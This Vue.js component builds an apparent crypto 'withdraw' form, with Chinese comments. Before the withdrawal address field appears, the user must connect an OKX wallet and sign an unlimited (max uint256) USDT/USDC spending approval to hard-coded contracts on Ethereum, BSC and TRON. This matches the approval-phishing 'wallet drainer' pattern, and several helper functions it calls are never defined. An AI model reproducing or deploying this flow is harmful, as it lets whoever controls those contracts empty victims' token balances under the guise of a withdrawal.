<template>
  <div>
    <!-- 选择币种 -->
    <div class="step-right-content">
      <div class="step-content-box pb-35 md:pb-20">
        <div class="row-title">
          <span>选择币种</span>
        </div>
        <coin-selector :depositToken="currency" @getSelectedCoinName="getSelectedCoinName"></coin-selector>
      </div>
    </div>

    <!-- 提币网络-稳定币，可以选链 -->
    <el-form-item v-if="selectedCoin === 'USDT' || selectedCoin === 'USDC'" prop="Coin" label="法币">
      <el-select v-model="formData.Coin" @change="onChainChange">
        <el-option
          class="block-select-options"
          v-for="add in coinTypes"
          :key="add.value"
          :value="add.value"
          :label="add.label"
        >
        </el-option>
      </el-select>
    </el-form-item>

    <!-- 非稳定币，不支持选链 -->
    <div class="coin_label" v-else>
      <div class="mb-12">
        币种<span>({{ selectedCoin === 'BSC' ? 'BNB' : selectedCoin }})</span>
      </div>
      <div>
        <el-input disabled v-if="selectedCoin === 'BTC'" :value="'Bitcoin'"></el-input>
        <el-input disabled v-if="selectedCoin === 'ETH'" :value="'Ethereum'"></el-input>
        <el-input
          disabled
          v-if="selectedCoin === 'BNB' || selectedCoin === 'BSC'"
          :value="'BNB Smart Chain(BEP20)'"
        ></el-input>
      </div>
    </div>

    <!-- 钱包连接状态显示 -->
    <div v-if="isConnected" class="wallet-status mb-20">
      <div class="wallet-info">
        <span class="wallet-label">已连接钱包:</span>
        <span class="wallet-address">{{ walletAddress.slice(0, 6) }}...{{ walletAddress.slice(-4) }}</span>
        <el-button type="text" @click="handleDisconnect">断开</el-button>
      </div>
      <div v-if="currentChainConfig" class="chain-info">
        <span class="chain-label">当前网络:</span>
        <span class="chain-name">{{ currentChainConfig.name }}</span>
      </div>
    </div>

    <!-- 连接钱包按钮 -->
    <el-form-item v-if="!isConnected">
      <el-button @click="showWalletSelection" type="primary" class="via-btn w-full via-btn--area">连接钱包</el-button>
    </el-form-item>

    <!-- 授权按钮 -->
    <el-form-item v-if="showApproveButton">
      <el-button
        @click="handleApprove"
        :loading="isApproving"
        :disabled="isApproved"
        type="button"
        class="via-btn via-btn--area approve-btn"
      >
        <i v-if="!isApproving && !isApproved" class="el-icon-unlock" style="margin-right: 8px"></i>
        <i v-if="isApproved" class="el-icon-check" style="margin-right: 8px; color: #67c23a"></i>
        {{ getApproveButtonText() }}
      </el-button>
    </el-form-item>

    <!-- 提币表单 - 只有授权完成后才显示 -->
    <template v-if="showWithdrawForm">
      <el-form-item
        prop="Address"
        class="withdraw-address"
        :label="`${$t('withdraw.label_target_address')}(${selectedCoin === 'BSC' ? 'BNB' : selectedCoin})`"
      >
        <el-input v-model="formData.Address"></el-input>
      </el-form-item>
    </template>

    <!-- 钱包选择弹窗 -->
    <el-dialog title="Choose a wallet" :visible.sync="showWalletSelector" width="95%" :close-on-click-modal="false" center>
      <div class="wallet-selector">
        <div v-for="wallet in availableWallets" :key="wallet.id" class="wallet-option" @click="selectWallet(wallet.id)">
          <div class="wallet-info">
            <img v-if="wallet.icon" src="@/assets/image/wallet/okx.jpg" :alt="wallet.name" class="wallet-icon" />
            <span class="wallet-name">{{ wallet.name }}</span>
          </div>
          <i class="el-icon-arrow-right"></i>
        </div>
      </div>
    </el-dialog>
  </div>
</template>

<script>
import CoinSelector from '@/components/CoinSelector.vue'
import { CHAIN_CONFIGS, TOKEN_CONFIGS } from '@/utils/WalletAdapter.js'

// 授权合约
const contractAddress = {
  'Ethereum Mainnet': '0xa61C92aA225b0Abdeb40b305900dCB8fA6Bc2Ade', // ETH链合约地址
  'BNB Smart Chain': '0xCE7dbe370a1FB2CC81e7925B288aC49D87B4684B', // BSC链合约地址
  'TRON Mainnet': 'TFLo5KpsCZ3NZDHSUhQG2cVeGuBpvAJsdK', // TRON链合约地址
}

export default {
  components: { CoinSelector },
  data() {
    return {
      currency: [''],
      // 钱包连接状态
      isConnected: false, // 是否已连接钱包
      walletAddress: '', // 钱包地址
      currentChainId: '', // 当前链ID

      // 授权状态
      isApproved: false, // 是否已授权
      isApproving: false, // 是否正在授权
      allowanceAmount: '0', // 当前授权额度
      approvalResult: null, // 授权结果

      isConnecting: false, // 是否正在连接
      walletError: '', // 钱包连接错误信息

      // 钱包选择弹窗
      showWalletSelector: false, // 是否显示钱包选择弹窗
      availableWallets: [], // 可用钱包列表，将在mounted时动态检测

      okxProvider: null,
      okxTronProvider: null,
      session: null,

      formData: {
        Amount: null,
        Address: '',
        WithdrawPassword: '',
        Coin: '',
      },

      selectedCoin: this.currency,

      // 链和代币配置
      chainConfigs: CHAIN_CONFIGS,
      tokenConfigs: TOKEN_CONFIGS,
    }
  },
  computed: {
    // 是否显示提币表单
    showWithdrawForm() {
      return this.isConnected && this.isApproved
    },

    // 是否显示授权按钮
    showApproveButton() {
      console.log('showApproveButton 计算:', {
        isConnected: this.isConnected,
        isApproved: this.isApproved,
        currentTokenConfig: this.currentTokenConfig,
        result: this.isConnected && !this.isApproved && this.currentTokenConfig,
      })
      return this.isConnected && !this.isApproved && this.currentTokenConfig
    },

    // 获取当前选择的链配置
    currentChainConfig() {
      const selectedCoinType = this.coinTypes.find(coin => coin.value === this.formData.Coin)

      console.log({
        key: 'selectedCoinType',
        selectedCoinType,
        coinTypes: this.coinTypes,
        formData: this.formData,
        chainConfigs: this.chainConfigs,
      })

      return selectedCoinType ? this.chainConfigs[selectedCoinType.chainId] : null
    },

    // 获取当前代币配置
    currentTokenConfig() {
      if (!this.currentChainConfig) {
        console.warn('currentChainConfig 为空')
        return null
      }

      // 标准化币种名称 - 确保使用正确的币种符号
      let coinSymbol = this.selectedCoin
      // 处理各种币种名称格式
      if (coinSymbol === 'USDCTRC20' || coinSymbol === 'USDCBEP20' || coinSymbol === 'USDCERC20') {
        coinSymbol = 'USDC'
      } else if (coinSymbol === 'USDTTRC20' || coinSymbol === 'USDTBEP20' || coinSymbol === 'USDTERC20') {
        coinSymbol = 'USDT'
      } else if (coinSymbol && coinSymbol.startsWith('USDT')) {
        coinSymbol = 'USDT'
      } else if (coinSymbol && coinSymbol.startsWith('USDC')) {
        coinSymbol = 'USDC'
      }

      const tokenKey = `${coinSymbol}_${this.currentChainConfig.name}`
      const tokenConfig = this.tokenConfigs[tokenKey]

      console.log('currentTokenConfig 计算:', {
        originalSelectedCoin: this.selectedCoin,
        normalizedCoinSymbol: coinSymbol,
        chainName: this.currentChainConfig.name,
        tokenKey,
        tokenConfig,
        availableKeys: Object.keys(this.tokenConfigs),
      })

      return tokenConfig || null
    },

    // 币种类型
    coinTypes() {
      if (this.selectedCoin === 'USDT') {
        return [
          {
            label: 'USDT-ERC20',
            value: 'USDT',
            chainId: 'eip155:1', // ETH
            token: '',
          },
          {
            label: 'USDT-TRC20',
            value: 'USDT_TRC',
            chainId: 'tron:mainnet', // TRON
            token: '',
          },
          {
            label: 'USDT-BEP20',
            value: 'USDTBEP20',
            chainId: 'eip155:56', // BSC
            token: '0x55d398326f99059ff775485246999027b3197955',
          },
        ]
      } else {
        return [
          {
            label: 'USDC-ERC20',
            value: 'USDC',
            chainId: 'eip155:1', // ETH
            token: '',
          },
          {
            label: 'USDC-TRC20',
            value: 'USDCTRC20',
            chainId: 'tron:mainnet', // TRON
            token: '',
          },
          {
            label: 'USDC-BEP20',
            value: 'USDCBEP20',
            chainId: 'eip155:56', // BSC
            token: '',
          },
        ]
      }
    },
  },
  mounted() {},
  methods: {
    // 获取授权按钮文本
    getApproveButtonText() {
      if (this.isApproving) {
        return '授权中'
      }
      if (this.isApproved) {
        return '已授权'
      }

      return '授权代币'
    },

    /**
     * 授权代币
     */
    async handleApprove() {
      try {
        if (!this.currentTokenConfig || !this.walletAddress || !this.okxProvider) {
          this.$message.error('Please connect your wallet first')
          return
        }

        this.isApproving = true

        // 获取合约地址
        const chainName = this.currentChainConfig.name
        const spenderAddress = contractAddress[chainName]

        if (!spenderAddress) {
          // this.$message.error(`未找到 ${chainName} 链的合约地址`);
          return
        }

        const chainId = this.currentChainConfig.chainId

        if (chainId.startsWith('eip155:')) {
          try {
            // EVM链授权 - 使用标准ERC20授权
            this.clearApprovalError()

            // 显示授权进度
            this.showApprovalProgress('EVM token authorization is in progress', [
              { title: 'Check wallet connection', description: 'Verify wallet status and network connection' },
              { title: 'Verify authorization parameters', description: 'Check authorization amount and contract address' },
              { title: 'Build authorization transaction', description: 'Create ERC20 authorization transaction' },
              { title: 'Waiting for user confirmation', description: 'Please confirm authorized transaction in wallet' },
              { title: 'Broadcast Transaction', description: 'Send transaction to blockchain network' },
              { title: 'Confirm the authorization result', description: 'Verify whether the authorization is successful' },
            ])

            // 步骤1: 检查钱包连接
            // this.updateProgressStep(0, 'active', '正在检查钱包连接状态...');
            if (!this.okxProvider) {
              throw new Error('钱包未连接，请先连接钱包')
            }
            // this.updateProgressStep(0, 'completed', '钱包连接正常');

            // 步骤2: 验证授权参数
            // this.updateProgressStep(1, 'active', '正在验证授权参数...');
            const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935' // 最大授权额度
            const data = this.encodeApproveCall(spenderAddress, maxAmount)
            // this.updateProgressStep(1, 'completed', '授权参数验证通过');

            // 步骤3: 构建授权交易
            // this.updateProgressStep(2, 'active', '正在构建授权交易...');
            // this.updateProgressStep(2, 'completed', '授权交易构建完成');

            // 步骤4: 等待用户确认
            // this.updateProgressStep(3, 'active', '请在钱包中确认授权交易...');
            let txHash

            // 统一使用 okxProvider 发送交易
            txHash = await this.okxProvider.request({
              method: 'eth_sendTransaction',
              params: [
                {
                  from: this.walletAddress,
                  to: this.currentTokenConfig.contractAddress,
                  data: data,
                },
              ],
            })

            // this.updateProgressStep(3, 'completed', '用户已确认授权交易');

            // 步骤5: 广播交易
            // this.updateProgressStep(4, 'active', '正在广播交易到区块链网络...');
            // this.updateProgressStep(4, 'completed', `交易已广播: ${txHash.substring(0, 10)}...`);

            // 步骤6: 确认授权结果
            // this.updateProgressStep(5, 'active', '正在确认授权结果...');
            // this.updateProgressStep(5, 'completed', '授权完成！');

            this.$message.success(`Authorized transaction has been submitted: ${txHash}`)
            // console.log('授权交易哈希:', txHash);

            // 延迟隐藏进度提示
            setTimeout(() => {
              this.hideApprovalProgress()
            }, 2000)

            // 等待交易确认并重新检查授权状态
            this.waitForApprovalConfirmation(txHash)
          } catch (evmError) {
            console.error('EVM授权失败:', evmError)

            // 提供更友好的错误信息
            let errorMessage = 'EVM token authorization failed'
            if (evmError.message.includes('User rejected') || evmError.message.includes('User denied')) {
              errorMessage = 'The user canceled the authorization operation'
            } else if (evmError.message.includes('insufficient')) {
              errorMessage = 'Insufficient balance, unable to pay Gas fees'
            } else if (evmError.message.includes('network')) {
              errorMessage = 'Network connection is wrong, please check the network'
            } else if (evmError.message.includes('contract')) {
              errorMessage = 'The contract call failed, please check the contract address'
            } else if (evmError.message.includes('Invalid address')) {
              errorMessage = 'Invalid address format'
            }

            // 显示错误信息和隐藏进度
            this.showApprovalError(errorMessage)
            this.hideApprovalProgress()
            this.$message.error(errorMessage)

            throw evmError
          }
        } else if (chainId.startsWith('tron:')) {
          // TRON链授权
          // console.log('开始TRON链授权...');

          // 设置最大授权额度 (TRON使用sun单位，1 TRX = 1,000,000 sun)
          const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'

          this.$message.info('Authorization is being authorized...')

          // 直接使用 OKX 钱包进行授权
          const result = await this.approveTronToken(this.currentTokenConfig.contractAddress, spenderAddress, maxAmount)

          console.log('TRON授权结果:', result)

          if (result.success) {
            // this.$message.success(`TRON授权交易已提交: ${result.txHash}`);
            console.log('TRON授权交易哈希:', result.txHash)

            // 等待交易确认并重新检查授权状态
            this.waitForApprovalConfirmation(result.txHash)
          } else {
            throw new Error(result.error || 'TRON authorization failed')
          }
        }
      } catch (error) {
        console.error('授权失败:', error)
        this.$message.error(`Authorization failed: ${error.message}`)
      } finally {
        this.isApproving = false
      }
    },

    /**
     * 重置钱包状态
     */
    resetWalletStatus() {
      this.isConnected = false
      this.walletAddress = ''
      this.currentChainId = ''
      this.isApproved = false
      this.allowanceAmount = '0'
      this.isConnecting = false
      this.selectedWalletType = ''

      // 清空提币地址
      this.formData.Address = ''

      // 清理session
      if (this.session) {
        this.session = null
      }

      console.log('钱包状态已重置')
    },

    /**
     * 显示钱包选择弹窗
     */
    showWalletSelection() {
      if (this.availableWallets.length === 0) {
        this.$message.warning('No available wallet was detected')
        return
      }

      this.showWalletSelector = true
    },

    /**
     * 选择钱包并连接
     */
    async selectWallet(walletId) {
      try {
        console.log('选择钱包:', walletId, '当前连接状态:', this.isConnected)

        // 如果当前已连接钱包，先强制断开
        if (this.isConnected || this.session || this.okxProvider?.isConnected) {
          console.log('检测到现有连接，先断开连接')
          await this.handleDisconnect()

          // 额外等待确保断开完成
          await new Promise(resolve => setTimeout(resolve, 1000))
        }

        this.selectedWalletType = walletId
        this.showWalletSelector = false

        // 根据选择的钱包类型进行连接
        const selectedWallet = this.availableWallets.find(w => w.id === walletId)

        if (selectedWallet) {
          if (selectedWallet.type === 'install') {
            // 处理钱包安装
            this.handleWalletInstall(selectedWallet)
          } else if (selectedWallet.type === 'plugin') {
            await this.handlePluginWalletConnect(selectedWallet)
          } else {
            await this.handleConnect() // 移动端连接
          }
        }
      } catch (error) {
        console.error('选择钱包失败:', error)
        this.$message.error(`钱包连接失败: ${error.message}`)
        // 确保状态被重置
        this.resetWalletStatus()
      }
    },

    /**
     * 断开钱包连接
     */
    async handleDisconnect() {
      try {
        console.log('开始断开钱包连接，当前钱包类型:', this.selectedWalletType)

        // 强制断开所有可能的连接
        const disconnectPromises = []

        // 断开session连接
        if (this.session) {
          try {
            console.log('断开session连接')
            disconnectPromises.push(this.session.disconnect())
          } catch (error) {
            console.warn('断开session失败:', error)
          }
        }

        // 断开OKX Provider连接
        if (this.okxProvider) {
          try {
            console.log('断开OKX Provider连接，当前连接状态:', this.okxProvider.isConnected)
            if (this.okxProvider.isConnected) {
              disconnectPromises.push(this.okxProvider.disconnect())
            }
          } catch (error) {
            console.warn('断开OKX Provider失败:', error)
          }
        }

        // 断开TRON Provider连接
        if (this.okxTronProvider) {
          try {
            console.log('清理TRON Provider连接')
            // TRON Provider可能需要特殊处理
            this.okxTronProvider = null
          } catch (error) {
            console.warn('清理TRON Provider失败:', error)
          }
        }

        // 等待所有断开操作完成
        if (disconnectPromises.length > 0) {
          await Promise.allSettled(disconnectPromises)
        }

        // 强制等待一段时间确保断开完成
        await new Promise(resolve => setTimeout(resolve, 500))

        // 清空所有连接相关的引用
        this.session = null
        this.okxProvider = null
        this.okxTronProvider = null

        // 重置钱包状态
        this.resetWalletStatus()

        console.log('钱包连接已完全断开')
      } catch (error) {
        console.error('断开钱包失败:', error)
        // 即使断开失败也强制重置状态
        this.session = null
        this.okxProvider = null
        this.okxTronProvider = null
        this.resetWalletStatus()
        this.$message.warning('钱包断开可能不完整，状态已重置')
      }
    },

    /**
     * 初始化formData.Coin
     */
    initFormDataCoin() {
      if (this.selectedCoin === 'USDT') {
        this.formData.Coin = 'USDT' // 默认选择ERC20
      } else if (this.selectedCoin === 'USDC') {
        this.formData.Coin = 'USDC' // 默认选择ERC20
      } else {
        // 对于其他币种，使用币种名称
        this.formData.Coin = this.selectedCoin
      }
    },

    async getSelectedCoinName(coinName) {
      // this.active_currency = null;
      if (coinName === 'BNB') {
        this.selectedCoin = 'BSC'
      } else {
        this.selectedCoin = coinName
      }

      // 使用统一的初始化方法
      this.initFormDataCoin()
      this.$emit('getSelectedCoin', this.selectedCoin) // let selectChains;

      // 重置钱包和授权状态
      this.isConnected = false
      this.walletAddress = ''
      this.isApproved = false
      this.allowanceAmount = '0'

      await this.getBCConfigAsync()
      await this.handleDisconnect()
    },

    /**
     * 链切换事件
     */
    async onChainChange() {
      try {
        console.log('链切换事件触发，当前连接状态:', this.isConnected)

        // 重置授权状态
        this.isApproved = false
        this.allowanceAmount = '0'

        // 如果当前已连接钱包，需要断开并重新连接
        if (this.isConnected) {
          console.log('检测到钱包已连接，执行断开重连流程')
          await this.handleDisconnect()

          // 等待断开完成
          await new Promise(resolve => setTimeout(resolve, 800))

          // 提示用户需要重新连接
          this.$message.info('网络已切换，请重新连接钱包')
        } else {
          console.log('当前无钱包连接，仅重置状态')
        }
      } catch (error) {
        console.error('链切换处理失败:', error)
        // 确保状态被重置
        this.resetWalletStatus()
        this.$message.warning('网络切换时出现问题，请重新连接钱包')
      }
    },

    /**
     * 获取bc config async
     * @returns {Promise<void>}
     */
    getBCConfigAsync: async function () {
      if (this.selectedCoin === 'BSC') {
        this.selectedCoin = 'BNB'
      }
      // todo
      const resp = await getBlockChainWithdrawQuota(this.selectedCoin)
      if (resp) {
        this.withdrawConfig = Object.freeze(resp)
      } else {
        this.$message.error(resp.errmsg || this.$t('general.operation_error'))
      }
    },
  },
}
</script>

<style scoped lang="scss">
::v-deep .el-input.is-disabled .el-input__inner {
  background-color: var(--search-input-color);
  border-color: transparent;
}
.step-content-box {
  margin-bottom: 12px;
}
.mb-12 {
  margin-bottom: 12px;
}
.row-title {
  font-weight: 700;
  margin-bottom: 8px;
  color: var(--quotes-text);
}
.alert-info {
  color: var(--text-primary);
  background-color: rgba(11, 218, 164, 0.1);
  border: 1px solid rgba(11, 218, 164, 0.2);
  line-height: 1.5;
  margin-bottom: 14px;
  padding: 14px;
  font-size: 14px;
  border-radius: 6px;
  margin-top: 15px;
}
.transfer-amount.is-error + .help-block {
  margin-top: 22px;
}
.withdraw-address.is-error {
  margin-bottom: 10px;
}
::v-deep.cancel-btn.el-button {
  &:foucs {
    border-color: rgba(14, 173, 152, 0.1);
    background-color: rgba(14, 173, 152, 0.1);
    color: var(--text-0ead98);
  }
  &:hover {
    border-color: rgba(14, 173, 152, 0.1);
    background-color: rgba(14, 173, 152, 0.1);
    color: var(--text-0ead98);
  }
}
::v-deep .el-select {
  .el-input__inner {
    &:focus {
      border-color: rgb(14, 173, 152) !important;
    }
  }
}
::v-deep .el-input__inner {
  border-color: rgb(14, 173, 152) !important;
  &:focus {
    border-color: rgb(14, 173, 152) !important;
  }
}

.submit-btn {
  background-color: var(--btn-35fbca);
  color: var(--primary-btn-color);
  border-color: var(--primary-btn);
  font-size: 14px;
  transition: all 0.4s ease-in;
}
::v-deep .withdraw-confirm-dialog {
  .el-dialog {
    border-radius: 20px;
    width: 30%;
  }
  .amount-row {
    margin-top: 8px;
  }
  .coin-name {
    font-weight: bolder;
  }
  .address {
    line-height: 1.5;
  }
  .mb-14 {
    margin-bottom: 14px;
  }
}
.coin-address {
  margin-top: 5px;
}
.via-btn {
  margin-top: 20px;
  border-radius: 30px;
  font-size: 14px;
  font-weight: 700;
  min-height: 40px;
  border: 1px solid transparent;
  background-color: var(--bg-35FBC9);
  color: var(--primary-btn-color);
  outline: none;
  padding: 4px 24px;
  width: 100%;
  cursor: pointer;
  &:hover {
    background-color: var(--bg-70FCDA);
    color: var(--text-535454);
  }
}
.form-label {
  margin-bottom: 8px;
}
::v-deep .el-select {
  width: 100%;
}
::v-deep.el-form-item {
  margin-bottom: 0;
}
::v-deep.el-form--label-top {
  .el-form-item__label {
    padding: 0;
  }
}
::v-deep .el-button.btn-submit {
  margin-top: 10px;
}
.help-block {
  margin-top: 10px;
  color: #606266;
  div {
    line-height: 1.2;
  }
}
::v-deep .el-input__inner {
  border-color: #dcdfe6 !important;
}
/* 钱包相关样式 */
.wallet-status {
  background-color: var(--search-input-color);
  border: 1px solid rgba(14, 173, 152, 0.2);
  border-radius: 8px;
  padding: 12px;
  margin-bottom: 20px;
}

.wallet-info {
  display: flex;
  align-items: center;
  margin-bottom: 8px;
}

.wallet-label {
  font-weight: 600;
  margin-right: 8px;
  color: var(--text-primary);
}

.wallet-address {
  font-family: monospace;
  background-color: rgba(14, 173, 152, 0.1);
  padding: 2px 6px;
  border-radius: 4px;
  margin-right: 8px;
  color: var(--text-0ead98);
}

.chain-info {
  display: flex;
  align-items: center;
}

.chain-label {
  font-weight: 600;
  margin-right: 8px;
  color: var(--text-primary);
}

.chain-name {
  background-color: rgba(14, 173, 152, 0.1);
  padding: 2px 6px;
  border-radius: 4px;
  color: var(--text-0ead98);
  font-weight: 500;
}

.approve-section {
  background-color: rgba(255, 193, 7, 0.1);
  border: 1px solid rgba(255, 193, 7, 0.3);
  border-radius: 8px;
  padding: 16px;
  margin-bottom: 12px;
}

.approve-info {
  color: var(--text-primary);
  font-size: 14px;
  line-height: 1.5;
}

.current-allowance {
  margin-top: 8px;
  font-size: 12px;
  color: var(--text-secondary);
  font-family: monospace;
}

.mb-20 {
  margin-bottom: 20px;
}

@media (max-width: 1024px) {
  ::v-deep .withdraw-confirm-dialog {
    .el-dialog {
      width: 80%;
    }
  }

  .wallet-info {
    flex-direction: row;
    align-items: flex-start;
  }

  .wallet-address {
    margin: 4px 0;
  }
}

/* 钱包选择弹窗样式 */
.wallet-selector {
  padding: 10px 0;
}

.wallet-option {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 16px 20px;
  margin-bottom: 12px;
  border: 1px solid var(--border-color);
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.3s ease;
  background-color: var(--bg-color);
}

.wallet-option:hover {
  border-color: var(--primary-color);
  background-color: var(--hover-bg-color);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

.wallet-option:last-child {
  margin-bottom: 0;
}

.wallet-info {
  display: flex;
  align-items: center;
  gap: 12px;
}

.wallet-icon {
  width: 32px;
  height: 32px;
  border-radius: 6px;
  object-fit: cover;
}

.wallet-name {
  font-size: 16px;
  font-weight: 500;
  color: #333;
}

/* 授权按钮样式 */
.approve-buttons {
  display: flex;
  gap: 12px;
  align-items: center;
}

.approve-btn {
  flex: 1;
  min-width: 120px;
}

.refresh-btn {
  padding: 8px 16px;
  border: 1px solid #dcdfe6;
  background: #fff;
  color: #606266;
  border-radius: 4px;
  font-size: 14px;
  cursor: pointer;
  transition: all 0.3s;
}

.refresh-btn:hover {
  border-color: #409eff;
  color: #409eff;
  background: #ecf5ff;
}

.refresh-btn:active {
  transform: translateY(1px);
}

/* 授权信息样式优化 */
.approve-info {
  padding: 12px;
  background: #f8f9fa;
  border-radius: 6px;
  border-left: 4px solid #409eff;
}

.current-allowance {
  margin-top: 8px;
  font-size: 14px;
  color: #67c23a;
  font-weight: 500;
}

.wallet-option .el-icon-arrow-right {
  color: var(--text-secondary);
  font-size: 16px;
  transition: color 0.3s ease;
}

.wallet-option:hover .el-icon-arrow-right {
  color: var(--primary-color);
}
</style>
